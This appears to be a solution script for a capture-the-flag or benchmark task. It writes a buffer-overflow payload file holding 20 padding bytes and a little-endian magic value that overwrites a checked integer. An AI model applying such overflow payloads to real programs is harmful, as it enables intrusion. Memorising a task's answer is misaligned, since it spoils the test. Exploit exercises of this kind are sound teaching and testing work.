#!/usr/bin/env bash
set -euo pipefail
python3 - <<'PY'
from pathlib import Path
# objdump shows a 20-byte gap from the buffer to the checked integer and a
# comparison against 0xcaf3baee. Store that value in little-endian order.
Path("/app/exploit.bin").write_bytes(b"A" * 20 + bytes.fromhex("eebaf3ca"))
PY
